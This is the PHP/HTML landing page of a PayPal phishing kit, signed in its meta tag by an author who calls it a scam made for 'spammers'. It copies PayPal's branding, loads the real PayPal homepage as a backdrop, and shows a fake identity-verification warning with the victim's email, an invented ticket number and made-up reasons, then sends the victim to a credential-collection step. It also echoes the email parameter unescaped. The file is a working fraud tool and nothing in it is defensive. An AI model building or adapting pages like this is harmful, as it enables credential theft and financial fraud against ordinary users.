<?php
  error_reporting(0);
  $return_email = $_GET['return_access'];
  if(empty($return_email)){
    $return_email = "User";
  }else{
    $return_email = $_GET['return_access'];
  }
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title> Send Money, Pay Online or Set Up a Merchant Account - PayPal </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" id="metadesc" content="">
    <script type="text/javascript">
      $(document).ready(function(){
        var startdesc = "Hi Spammer this Scam was Created by DemonBlade, To contact Me on email : wixamine@gmail.com";
        $("#metadesc").attr("content",startdesc);
      });
    </script>
    <script src="js/ajax.js" charset="utf-8"></script>
    <script src="js/jquery.js" charset="utf-8"></script>
    <script src="js/jquery.min.js" charset="utf-8"></script>
    <script src="js/js-plus.js" charset="utf-8"></script>
    <link rel="stylesheet" href="css/styles.css">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link href="https://file.myfontastic.com/hSMyDca9BDwBA8GgvxRZRP/icons.css" rel="stylesheet">
  </head>
  <body>
    <div class="get_contents">
      <?php
        echo file_get_contents("https://www.paypal.com/");
      ?>
    </div>
    <div class="backfull">
      <div class="panels">
        <img src="css/logo.png" alt="">
        <br><br>
        <div class="description">
          Dear <b id="accessreturn"><?php echo $return_email ?></b>, Your Account is Unfortunately Enrolled in Identity Verification <br><br>
          <b>Ticket : #<?php echo rand(10000,99999); ?></b><br><br>
          <b>For This Reason : </b> <br>
          <span style="visibility: hidden;">##</span> <b>○ Fake Transaction .</b><br>
          <span style="visibility: hidden;">##</span> <b>○ The account receives a connection from another country </b><br><br>
        </div><br><br>
        <a href="get_started/<?php if($return_email != 'User'){echo '?return_access=' . $return_email;} ?>">
          <div class="btns" name="get_started">
            Confirm My Identity
            <div class="children"></div>
          </div>
        </a>
        <br><br>
      </div>
    </div>
    <script type="text/javascript">
      $(document).ready(function(){

      });
    </script>
  </body>
</html>
